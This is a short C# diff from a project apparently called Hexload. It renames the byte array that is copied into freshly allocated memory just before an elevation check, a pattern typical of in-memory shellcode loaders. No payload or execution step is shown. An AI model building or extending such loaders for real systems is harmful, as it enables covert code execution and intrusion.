@@ -126,8 +126,8 @@ namespace Hexload
                     return;
                 }
 
-                IntPtr pointer = SecureVirtualAlloc(hexy.Length);
-                Marshal.Copy(hexy, 0, pointer, hexy.Length);
+                IntPtr pointer = SecureVirtualAlloc(hexr.Length);
+                Marshal.Copy(hexr, 0, pointer, hexr.Length);
                 
                 if (IsElevated())
                 {
